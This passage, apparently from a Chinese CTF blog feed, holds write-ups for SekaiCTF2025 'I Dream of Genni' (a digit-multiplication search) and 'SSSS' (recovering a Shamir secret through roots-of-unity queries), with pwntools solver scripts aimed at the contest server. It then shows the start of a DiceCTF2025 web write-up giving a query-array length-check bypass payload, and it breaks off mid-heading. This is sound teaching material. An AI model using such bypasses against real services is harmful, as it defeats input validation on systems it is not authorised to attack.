id="SekaiCTF2025-I-Dream-of-Genni"><a href="#SekaiCTF2025-I-Dream-of-Genni" class="headerlink" title="SekaiCTF2025 - I Dream of Genni"></a>SekaiCTF2025 - I Dream of Genni</h1><blockquote><p>I had the strangest dream last night.<br><img src="https://pica.zhimg.com/80/v2-9b1b1527b59468d80a3fc9902213e5e3_1440w.png" alt=""></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter an 8-digit multiplicand: &#x27;</span>))</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter a 7-digit multiplier: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">1e6</span> &lt;= y &lt; <span class="number">1e7</span> &lt;= x &lt; <span class="number">1e8</span>, <span class="string">&quot;Incorrect lengths&quot;</span></span><br><span class="line"><span class="keyword">assert</span> x * y != <span class="number">3_81_40_42_24_40_28_42</span>, <span class="string">&quot;Insufficient ntr-opy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dream_multiply</span>(<span class="params">x, y</span>):</span><br><span class="line">    x, y = <span class="built_in">str</span>(x), <span class="built_in">str</span>(y)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x) == <span class="built_in">len</span>(y) + <span class="number">1</span></span><br><span class="line">    digits = x[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x[<span class="number">1</span>:], y):</span><br><span class="line">        digits += <span class="built_in">str</span>(<span class="built_in">int</span>(a) * <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(digits)</span><br><span class="line"><span class="keyword">assert</span> dream_multiply(x, y) == x * y, <span class="string">&quot;More like a nightmare&quot;</span></span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;75bd1089b2248540e3406aa014dc2b5add4fb83ffdc54d09beb878bbb0d42717e9cc6114311767dd9f3b8b070b359a1ac2eb695cd31f435680ea885e85690f89&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(AES.new(sha256(<span class="built_in">str</span>((x, y)).encode()).digest(), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(ct)).decode())</span><br></pre></td></tr></table></figure><p>这题密码打的标签是<code>misc</code>，确实哈</p><p>题目的意思一目了然，看一下图片就知道了，需要找到另外一组满足条件的八位数和七位数</p><p>自己写不大会，<code>AI</code>不靠谱，春哥写的多线程学不来(我的电脑要跑九个小时)，最后学习一下<strong>官方wp</strong></p><p>八位乘七位，八位的第一位可以直接写下来暂不做考虑，剩下的乘出来都是两位数，所以我们快速一点，可以建立一个元组，储存起来，方便运算调用，也省搜索空间</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pairs = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">if</span> x*y &gt;= <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p>然后是完成题目算法的构建，模十可以得到各个位置的数字，再扩大相应位数，这里相乘了，是以百为基数，最终将数字拼接起来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">multwo</span>(<span class="params">i, j, digits</span>):</span><br><span class="line">    s, mul = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>((digits+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">        s += (i % <span class="number">10</span>) * (j % <span class="number">10</span>) * mul</span><br><span class="line">        i, j, mul = i // <span class="number">10</span>, j // <span class="number">10</span>, mul * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><p>处理函数<code>process</code>，先看这一部分代码，是从低位向高位构建拼接的一个过程，只有每一次的低两位、低三四位、低五六位…是假设目标解的一部分，才会进入下一个递归，然后继续从<code>pairs</code>里面取对，继续判断是否是正解的一部分(这就是剪枝的工作过程)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mul = <span class="number">10</span>**digits</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> pairs:</span><br><span class="line">    x2 = a*mul + x</span><br><span class="line">    y2 = b*mul + y</span><br><span class="line">    <span class="keyword">if</span> (multwo(x2, y2, digits+<span class="number">1</span>) - x2*y2) % (<span class="number">10</span>*mul) == <span class="number">0</span>:</span><br><span class="line">        process(x2, y2, digits+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>但这样的话，最终只能得到拼接结果的后七位与相乘的后七位一样(N=7)的结果，所以才会是八位和七位相乘，不然是找不到这样的两个数的</p><p>七位与七位相乘的结果会比拼接的大，此时，根据二者的差值以及<code>y</code>可以构建出第八位，从而得到目标解</p><p>$用数学来表示就是：$<br>$X=d_{8}<em>10^{7}+x$<br>$(d_{8}</em>10^{7}+x)<em>y=d_{8}</em>10^{14}+multwo(x,y,14)$<br>$x<em>y-multwo(x,y,14)=d_{8}</em>10^{14}-d_{8}<em>10^{7}</em>y$<br>$x<em>y-multwo(x,y,14)=d_{8}</em>10^{7}*(10^{7}-y)$<br>$n1需要整除n2才能得到正确的d_{8}，同时确保比10倍小$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> digits == N:</span><br><span class="line">    n1 = x*y - multwo(x, y, N*<span class="number">2</span>)</span><br><span class="line">    n2 = <span class="number">10</span>**N * (<span class="number">10</span>**N - y)</span><br><span class="line">    <span class="keyword">if</span> n1 &lt; <span class="number">10</span> * n2 <span class="keyword">and</span> n1 % n2 == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1//n2&#125;</span><span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pairs = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">if</span> x*y &gt;= <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multwo</span>(<span class="params">i, j, digits</span>):</span><br><span class="line">    s, mul = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>((digits+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">        s += (i % <span class="number">10</span>) * (j % <span class="number">10</span>) * mul</span><br><span class="line">        i, j, mul = i // <span class="number">10</span>, j // <span class="number">10</span>, mul * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">x, y, digits, N=<span class="number">7</span></span>):</span><br><span class="line">    <span class="keyword">if</span> digits == N:</span><br><span class="line">        n1 = x*y - multwo(x, y, N*<span class="number">2</span>)</span><br><span class="line">        n2 = <span class="number">10</span>**N * (<span class="number">10</span>**N - y)</span><br><span class="line">        <span class="keyword">if</span> n1 &lt; <span class="number">10</span> * n2 <span class="keyword">and</span> n1 % n2 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1//n2&#125;</span><span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    mul = <span class="number">10</span>**digits</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> pairs:</span><br><span class="line">        x2 = a*mul + x</span><br><span class="line">        y2 = b*mul + y</span><br><span class="line">        <span class="keyword">if</span> (multwo(x2, y2, digits+<span class="number">1</span>) - x2*y2) % (<span class="number">10</span>*mul) == <span class="number">0</span>:</span><br><span class="line">            process(x2, y2, digits+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">process(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>真的是很有意思的一道题目<strong>oVo</strong></p><h1 id="SekaiCTF2025-SSSS"><a href="#SekaiCTF2025-SSSS" class="headerlink" title="SekaiCTF2025 - SSSS"></a>SekaiCTF2025 - SSSS</h1><blockquote><p>Shamir SendS the Secret to everyone</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SEKAI&#123;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">secret</span>):</span><br><span class="line">  t = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">  <span class="keyword">assert</span> <span class="number">20</span> &lt;= t &lt;= <span class="number">50</span>, <span class="string">&quot;Number of parties not in range&quot;</span></span><br><span class="line"></span><br><span class="line">  f = gen(t, secret)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt; x &lt; p, <span class="string">&quot;Bad input&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(poly_eval(f, x))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>()) == secret:</span><br><span class="line">    <span class="built_in">print</span>(FLAG)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;:&lt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">degree, secret</span>):</span><br><span class="line">  poly = [random.randrange(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(degree + <span class="number">1</span>)]</span><br><span class="line">  index = random.randint(<span class="number">0</span>, degree)</span><br><span class="line"></span><br><span class="line">  poly[index] = secret</span><br><span class="line">  <span class="keyword">return</span> poly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_eval</span>(<span class="params">f, x</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sum</span>(c * <span class="built_in">pow</span>(x, i, p) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(f)) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  secret = random.randrange(<span class="number">0</span>, p)</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    challenge(secret)</span><br></pre></td></tr></table></figure><p>$不怎么接触Shamir，遂记录一下$</p><p>$根据题目，得到t+1项的t次多项式$</p><script type="math/tex; mode=display">f(x)=c_{0}+c_{1}x+...+Sx^{index}+...+c_{t}x^{t}\pmod p</script><p>$循环t次，输入得到t个点(x_{i},f(x_{i}))，调用两次challenge()$<br>$每次的多项式的系数和位置会不一样，但secret数值固定$</p><p>$正常来说，借助拉格朗日差值公式恢复多项式的所有系数我们需要t+1个不同的点，但此处最多只能获得t个不同的点$</p><p>$下面参考官方wp脚本，写了一下自己的思考$</p><p>$其实还可以这样表示：f(x)=P_{t-1}(x)+C(x-x_{1})(x-x_{2})…(x-x_{t})$</p><p>$ord(Z_p^{*})=p-1，t\ |\ p-1，t=29，t\in [20,50]$<br>$可以找到生成元g生成的循环子群<g>=\{g^{0},g^{1},…,g^{t-1}\}$<br>$g^{t}\equiv 1\pmod p$<br>$取x_{i}=g^{i}\pmod p，t次单位根，得到下面的式子$</p><p>$f(x)=P_{t-1}(x)+C(x^{t}-1)$</p><p>$P_{t-1}(x)=R.lagrange_polynomial(shares)=a_{t-1}x^{t-1}+…+a_{1}x+a_{0}$</p><p>$c_{t}x^{t}+…+c_{1}x+c_{0}=C\cdot x^{t}+a_{t-1}x^{t-1}+…+a_{1}x+(a_{0}-C)$</p><p>$c_{t}=C$<br>$c_{t-1}=a_{t-1},…,c_{1}=a_{1}$<br>$c_{0}=a_{0}-C$</p><p>$借助sage自带的拉格朗日差值公式，取两次多项式系数的交集就可以得到secret(两次secret都要落在[c_{1}-c_{t-1}])$</p><p>$注意g^{t}=1\pmod p，这样的g只有t个，直接找概率很低$<br>$我们构造h=base^{\frac{p-1}{t}}\pmod p$<br>$h^{t}=1\pmod p，ord(h)\ |\ t，if\ h\not = 1，ord(h)=t$<br>$这样P(h\not =1)=1-\frac{(p-1)/t}{p-1}=28/29$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">R.&lt;x0&gt; = GF(p)[]</span><br><span class="line">t = <span class="number">29</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># conn = process([&quot;python3&quot;, &quot;../dist/chall.py&quot;])</span></span><br><span class="line">conn = remote(<span class="string">&#x27;ssss.chals.sekai.team&#x27;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">  conn.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line">  g = <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)//t, p) == <span class="number">1</span>:</span><br><span class="line">    g += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  g = <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)//t, p)</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">pow</span>(g, t, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  shares = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    x = <span class="built_in">pow</span>(g, i, p)</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    y = <span class="built_in">int</span>(conn.recvline())</span><br><span class="line">    shares.append((x, y))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">list</span>(R.lagrange_polynomial(shares))</span><br><span class="line"></span><br><span class="line">A = query()</span><br><span class="line">conn.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">conn.recvline()  <span class="comment"># :&lt;</span></span><br><span class="line"></span><br><span class="line">B = query()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> secret <span class="keyword">in</span> A:</span><br><span class="line">  <span class="keyword">if</span> secret <span class="keyword">in</span> B:</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(secret).encode())</span><br><span class="line">    <span class="built_in">print</span>(conn.recvline().decode().strip())</span><br></pre></td></tr></table></figure><p>$这个是春哥的思路，直接到了底层$</p><script type="math/tex; mode=display">\left [ \begin{matrix}x_1^0 & x_1^1 & \dots & x_1^{t-1} \\x_2^0 & x_2^1 & \dots & x_2^{t-1} \\\vdots & \vdots & \ddots & \vdots \\x_t^0 & x_t^1 & \dots & x_t^{t-1}\end{matrix} \right ]\cdot\left [ \begin{matrix}c_0 \\c_1 \\\vdots \\c_{t-1}\end{matrix} \right ]\ =\left [ \begin{matrix}y_1 \\y_2 \\\vdots \\y_t\end{matrix} \right ]</script><p>$A\cdot c=b，A称为范德蒙德矩阵，只要所有的x_{j}互不相同，这个矩阵就是可逆的，方程就有唯一解c$<br>$范德蒙德矩阵是拉格朗日差值公式的基础，又从春哥那学到知识了$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gao</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># self.conn = process([&#x27;python3&#x27;, &#x27;another.py&#x27;])</span></span><br><span class="line">        self.conn = remote(<span class="string">&#x27;ssss.chals.sekai.team&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">        self.p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">        self.Zp = Zmod(self.p)</span><br><span class="line">        self.g = <span class="number">68182365146192563136101852599586284510469631280758214998024143739738246750499</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao_1</span>(<span class="params">self</span>):</span><br><span class="line">        Zp = self.Zp</span><br><span class="line">        g = Zp(self.g)</span><br><span class="line"></span><br><span class="line">        t = <span class="number">29</span></span><br><span class="line">        self.conn.sendline(<span class="built_in">str</span>(t))</span><br><span class="line">        A, b = [], []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">            x = g ** j</span><br><span class="line">            self.conn.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">            y = <span class="built_in">int</span>(self.conn.recvline())</span><br><span class="line">            A.append([Zp(x) ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)])</span><br><span class="line">            b.append(Zp(y))</span><br><span class="line">        A = matrix(Zp, A)</span><br><span class="line">        b = vector(Zp, b)</span><br><span class="line">        x = A.solve_right(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(x.<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao</span>(<span class="params">self</span>):</span><br><span class="line">        a = self.gao_1()</span><br><span class="line">        self.conn.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        self.conn.recvline()</span><br><span class="line">        b = self.gao_1()</span><br><span class="line">        num = a &amp; b</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(num) == <span class="number">1</span>, <span class="string">&quot;Multiple secrets found&quot;</span></span><br><span class="line">        secret = num.pop()</span><br><span class="line">        self.conn.sendline(<span class="built_in">str</span>(secret))</span><br><span class="line">        self.conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    g = Gao()</span><br><span class="line">    g.gao()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里也记录一下，各种比赛零零散散的题目(觉得比较有意思的)&lt;/p&gt;
&lt;h1 id=&quot;KalmarCTF2025-basic-sums&quot;&gt;&lt;a href=&quot;#KalmarCTF2025-basic-sums&quot; class=&quot;headerlink&quot; title=&quot;KalmarC</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DiceCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/</id>
    <published>2025-03-30T17:38:57.000Z</published>
    <updated>2025-04-01T19:11:05.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="cookie-recipes-v3"><a href="#cookie-recipes-v3" class="headerlink" title="cookie-recipes-v3"></a>cookie-recipes-v3</h2><blockquote><p>Mmmmmmm…</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookies = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.<span class="property">headers</span>.<span class="property">cookie</span></span><br><span class="line">    <span class="keyword">const</span> user = cookies?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123; req.<span class="property">user</span> = user &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> id = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">slice</span>(<span class="number">2</span>)</span><br><span class="line">        res.<span class="title function_">setHeader</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`user=<span class="subst">$&#123;id&#125;</span>`</span>)</span><br><span class="line">        req.<span class="property">user</span> = id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.xz.style/serve/inter.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;You have &lt;span&gt;<span class="subst">$&#123;count&#125;</span>&lt;/span&gt; cookies&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;basic&quot;&gt;Basic cookie recipe (makes one)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;advanced&quot;&gt;Advanced cookie recipe (makes a dozen)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button disabled&gt;Super cookie recipe (makes a million)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;deliver&quot;&gt;Deliver cookies&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;/script.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/script.js&#x27;</span>, <span class="function">(<span class="params">_req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;js&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        const basic = document.querySelector(&#x27;#basic&#x27;)</span></span><br><span class="line"><span class="string">        const advanced = document.querySelector(&#x27;#advanced&#x27;)</span></span><br><span class="line"><span class="string">        const deliver = document.querySelector(&#x27;#deliver&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        const showCookies = (number) =&gt; &#123;</span></span><br><span class="line"><span class="string">            const span = document.querySelector(&#x27;span&#x27;)</span></span><br><span class="line"><span class="string">            span.textContent = number</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        basic.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=1&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        advanced.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=12&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        deliver.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/deliver&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const text = await res.text()</span></span><br><span class="line"><span class="string">            alert(text)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/deliver&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> current = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> target = <span class="number">1_000_000_000</span></span><br><span class="line">    <span class="keyword">if</span> (current &lt; target) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`not enough (need <span class="subst">$&#123;target - current&#125;</span>) more`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>点击量需要十亿次</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>限制了我们传入的数字字符串<code>number</code>长度<code>小于等于2</code>，这里可以用<strong>数组绕过</strong>，从而检验的是<strong>数组的长度</strong>，而不是<strong>字符串长度</strong><br><code>POST /bake?number[]=99999999999999</code></p><h2 id="pyramid-复现学习"><a href="#pyramid-复现学习" class="headerlink" 